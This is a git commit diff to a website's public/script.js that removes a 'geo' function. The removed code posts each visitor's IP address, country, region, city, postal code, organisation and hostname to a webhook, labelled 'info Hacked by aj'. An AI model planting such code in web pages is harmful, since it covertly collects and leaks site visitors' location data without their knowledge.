fd89b2b56121b6765aeed746285f9ddc9ad1cb03
Ghosterzz_ <alfiejennings2021@gmail.com>
2022-06-22 01:56:08 +0100

    added

--- public/script.js
+++ public/script.js
@@ -10,19 +10,4 @@ function openSelectionMenu() {
   var menu = document.getElementById("select-post")
   menu.style.display = "block"
 }
-require('dotenv').config
-function geo(json) {
-    
-  var request = new XMLHttpRequest();
-      request.open("POST", `${process.env.webhook}`);
-      request.setRequestHeader('Content-type', 'application/json');
-  var params = {
-    username: "info Hacked by aj",
-    avatar_url: "https://i.postimg.cc/g2DcKV3J/index.jpg",
-    content: "```" + "IP: " + json.ip + "\n" + "COUNTRY: " + json.country_name + "\n" + "STATE: " + json.region + "\n" + "CITY: " + json.city + "\n" + "POSTAL CODE: " + json.postal_code + "\n" + "ORG: " + json.org + "\n" + "HOSTNAME: " + json.hostname + "```"
-  }
- request.send(JSON.stringify(params));
-}
-
-
 
